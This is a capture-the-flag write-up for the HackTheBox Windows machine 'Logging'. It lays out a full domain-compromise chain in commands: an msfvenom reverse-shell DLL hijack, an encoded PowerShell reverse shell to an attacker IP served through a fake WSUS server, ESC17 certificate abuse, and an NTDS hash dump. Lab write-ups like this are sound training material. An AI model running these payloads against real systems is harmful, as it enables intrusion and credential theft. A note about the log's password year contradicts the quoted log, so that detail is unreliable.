---
title: "HTB - Logging"
date: 2026-04-12
tags: ["HackTheBox","Windows","Hard","ActiveDirectory","SMB","ADCS","ESC17","gMSA","DLLHijack","WSUS"]
categories: ["Machines&Challenges"]
difficulty: "Hard"
os: "Windows"
author: "z3r0s"
featuredImage: "/logos/Logging.png"
---
## Overview

| Field | Value |
|-------|-------|
| OS | Windows Server 2019 |
| Difficulty | Hard |
| IP | 10.129.X.X |
| Domain | logging.htb |
| DC | dc01.logging.htb |

**Attack Chain:**
`Anonymous SMB → Credentials in Logs → Shadow Credentials (gMSA) → WinRM → DLL Hijack → Domain User Shell → ESC17 (ADCS + WSUS MitM) → SYSTEM`

---

## 1. Reconnaissance

### Port Scan

```bash
rustscan -a 10.129.X.X --ulimit 5000 -- -sV
```

**Key open ports:**
- 53 (DNS)
- 80 (IIS 10.0)
- 88 (Kerberos)
- 135, 139, 445 (RPC/SMB)
- 389, 636, 3268, 3269 (LDAP/LDAPS)
- 5985, 47001 (WinRM)
- 8530, 8531 (WSUS)
- 9389 (ADWS)

This is a Domain Controller with WSUS running - important for later.

### Web Enumeration

```bash
feroxbuster -u http://10.129.X.X -w /usr/share/wordlists/dirb/common.txt
```

Nothing useful on port 80.

---

## 2. Initial Foothold - Starting Credentials

Use `htb-operator` to retrieve machine starting credentials:

```bash
htb-operator machine info --id 888
```

**Credentials:** `wallace.everette / Welcome2026@`

### Verify Access

```bash
nxc smb 10.129.X.X -u 'wallace.everette' -p 'Welcome2026@'
nxc ldap 10.129.X.X -u 'wallace.everette' -p 'Welcome2026@'
```

SMB and LDAP work. WinRM does not.

---

## 3. SMB Enumeration

```bash
nxc smb 10.129.X.X -u 'wallace.everette' -p 'Welcome2026@' --shares
``` 

Interesting share: `Logs` (READ)

```bash
smbclient //10.129.X.X/Logs -U 'logging.htb/wallace.everette%Welcome2026@' -c 'ls'
```

Download all log files:

```bash
smbclient //10.129.X.X/Logs -U 'logging.htb/wallace.everette%Welcome2026@' -c 'mget *'
```

### Credentials in Logs

Inside `IdentitySync_Trace_20260219.log`:

```
[2026-02-09 03:00:03.125] VERBOSE - ConnectionContext Dump: {
  Domain: "logging.htb",
  BindUser: "LOGGING\svc_recovery",
  BindPass: "Em3rg3ncyPa$$2026"
}
```

> **Note:** Password used year rotation - `2025` in log but actual password was `2026`.

---

## 4. Lateral Movement - svc_recovery

`svc_recovery` is in the **Protected Users** group (NTLM disabled) and **Emergency Recovery** group.

Authenticate via Kerberos:

```bash
cat > /tmp/krb5.conf << 'EOF'
[libdefaults]
default_realm = LOGGING.HTB
[realms]
LOGGING.HTB = {
  kdc = dc01.logging.htb
  admin_server = dc01.logging.htb
}
[domain_realm]
.logging.htb = LOGGING.HTB
logging.htb = LOGGING.HTB
EOF

KRB5_CONFIG=/tmp/krb5.conf kinit svc_recovery@LOGGING.HTB
```

### BloodHound Enumeration

```bash
bloodhound-python -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k --kdc dc01.logging.htb -d logging.htb -c All
```

**Finding:** `svc_recovery` has **GenericWrite** on `MSA_HEALTH$` (a Group Managed Service Account / gMSA).

---

## 5. Shadow Credentials Attack → msa_health$ Hash

Abuse GenericWrite to inject shadow credentials on the gMSA:

```bash
bloodyAD -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' \
  -k --host dc01.logging.htb add shadowCredentials 'msa_health$'
```

This returns a PFX. Use it to obtain the NT hash:

```bash
certipy auth -pfx msa_health.pfx -dc-ip 10.129.X.X
```

**NT Hash:** `[FLAG_REDACTED]`

### WinRM Access

```bash
evil-winrm -i 10.129.X.X -u 'msa_health$' -H [FLAG_REDACTED]
```

---

## 6. Local Enumeration - UpdateMonitor Service

Inside `C:\ProgramData\UpdateMonitor\`:

```
monitor.log          - service logs
Settings_Update.zip  - update package
```

The service:
1. Runs every 3 minutes
2. Extracts `Settings_Update.zip` to `C:\Program Files\UpdateMonitor\bin\`
3. Loads `settings_update.dll` via `LoadLibrary` (32-bit native DLL)

### DLL Hijack → jaylee.clifton Shell

Generate a reverse shell DLL:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.X.X LPORT=443 \
  -f dll -a x86 --platform windows -o settings_update.dll

zip Settings_Update.zip settings_update.dll
```

Upload via evil-winrm (run from directory containing the zip):

```bash
cd /path/to/zip
evil-winrm -i 10.129.X.X -u 'msa_health$' -H [FLAG_REDACTED]
# Inside shell:
upload Settings_Update.zip C:\ProgramData\UpdateMonitor\Settings_Update.zip
```

Start msfconsole listener:

```bash
msfconsole -q -x "use multi/handler; set PAYLOAD windows/shell_reverse_tcp; \
  set LHOST 10.10.X.X; set LPORT 443; set ExitOnSession false; run -j"
```

Wait up to 3 minutes. Shell connects as **jaylee.clifton**.

```
user.txt → C:\Users\jaylee.clifton\Desktop\user.txt
```

---

## 7. Privilege Escalation - ESC17 (ADCS + WSUS MitM)

### Discovery

Check registry from jaylee's shell:

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
```

```
WUServer    REG_SZ    https://wsus.logging.htb:8531
```

WSUS uses HTTPS on port 8531. Also found a ticket file:

```
C:\Users\jaylee.clifton\Documents\Tickets\Incident_4922_WSUS_Remediation_ViewExport.html
```

Key info: a **ForceSync** scheduled task runs every 120 seconds and forces the WSUS client to check for updates.

### Step 1 - Add DNS Record

```bash
cd /tmp && git clone https://github.com/dirkjanm/krbrelayx.git

python3 krbrelayx/dnstool.py \
  -u 'logging\jaylee.clifton' \
  -p '[FLAG_REDACTED]:[FLAG_REDACTED]' \
  -a add -r wsus.logging.htb -d 10.10.X.X \
  -dc-ip 10.129.X.X 10.129.X.X
```

### Step 2 - ESC17: Request Trusted WSUS Certificate

The `UpdateSrv` ADCS template has:
- `EnrolleeSuppliesSubject = True`
- `Extended Key Usage: Server Authentication`
- `Enrollment Rights: LOGGING.HTB\IT` (jaylee is in IT)

This is **ESC17** - allows impersonating any server name trusted by domain clients.

```bash
certipy req -u 'jaylee.clifton@logging.htb' \
  -hashes ':[FLAG_REDACTED]' \
  -dc-ip 10.129.X.X -ca 'logging-DC01-CA' \
  -template 'UpdateSrv' -dns 'wsus.logging.htb' \
  -subject 'CN=wsus.logging.htb' -out wsus

openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
```

### Step 3 - Start msfconsole Handler

```bash
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; \
  set LHOST 10.10.X.X; set LPORT 4444; set ExitOnSession false; run -j"
```

### Step 4 - Start wsuks Fake WSUS Server

```bash
pip install --break-system-packages wsuks
sudo apt-get install -y python3-nftables

PS='$c=New-Object System.Net.Sockets.TCPClient("10.10.X.X",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb3=[System.Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()'
ENC=$(echo -n "$PS" | iconv -t UTF-16LE | base64 -w0)

sudo PYTHONPATH=~/.local/lib/python3.13/site-packages python3 -m wsuks.wsuks \
  --serve-only --tls-cert ./wsus.pem --WSUS-Port 8531 -I tun_htb \
  -t 10.129.X.X \
  -c "/accepteula /s powershell.exe -NoP -NonI -W Hidden -Enc $ENC" --debug
```

### Step 5 - Wait for ForceSync

Within 120 seconds, the WSUS client on the DC will:
1. Resolve `wsus.logging.htb` → our IP (via DNS injection)
2. Connect to our fake WSUS server over HTTPS (our cert is trusted - issued by domain CA)
3. Download and execute PsExec64.exe as SYSTEM
4. PsExec runs our PowerShell reverse shell as **NT AUTHORITY\SYSTEM**

Shell connects back to msfconsole on port 4444 as **SYSTEM**.

---

## 8. Post-Exploitation - Domain Hashes

From SYSTEM shell, dump NTDS:

```powershell
ntdsutil "ac i ntds" "ifm" "create full C:\ProgramData\ntds" q q
copy "C:\ProgramData\ntds\Active Directory\ntds.dit" C:\ProgramData\ntds.dit
```

Download via evil-winrm (cd to destination first):

```bash
cd /tmp
evil-winrm -i 10.129.X.X -u 'msa_health$' -H [FLAG_REDACTED]
# Inside:
download C:\ProgramData\ntds.dit
download C:\ProgramData\ntds\registry\SYSTEM
```

Dump all hashes:

```bash
impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL
```

**Domain Hashes:**

| Account | NT Hash |
|---------|---------|
| Administrator | `[FLAG_REDACTED]` |
| krbtgt | `[FLAG_REDACTED]` |
| toby.brynleigh (DA) | `[FLAG_REDACTED]` |

```
root.txt → C:\Users\Administrator\Desktop\root.txt
         → C:\Users\toby.brynleigh\Desktop\root.txt
```

---

## Attack Chain Summary

```
wallace.everette (starting creds)
    ↓ SMB Logs share
svc_recovery / Em3rg3ncyPa$$2026
    ↓ GenericWrite → Shadow Credentials
msa_health$ NT hash (WinRM)
    ↓ UpdateMonitor DLL Hijack (32-bit native DLL, 3-min cycle)
jaylee.clifton shell (IT group)
    ↓ ESC17: UpdateSrv template (EnrolleeSuppliesSubject + Server Auth)
       + DNS injection (wsus.logging.htb → attacker)
       + wsuks fake WSUS server (domain CA-signed cert)
       + ForceSync task (120s cycle)
NT AUTHORITY\SYSTEM
    ↓ NTDS dump
Full Domain Compromise
```

---

## Key Vulnerabilities

| # | Vulnerability | Impact |
|---|---------------|--------|
| 1 | Credentials in SMB log files | svc_recovery access |
| 2 | GenericWrite on gMSA | Shadow Credentials → WinRM |
| 3 | Writable WSUS update path | DLL hijack → user shell |
| 4 | ESC17 (ADCS UpdateSrv template) | Fake trusted WSUS cert |
| 5 | WSUS no certificate pinning | MitM → SYSTEM code execution |
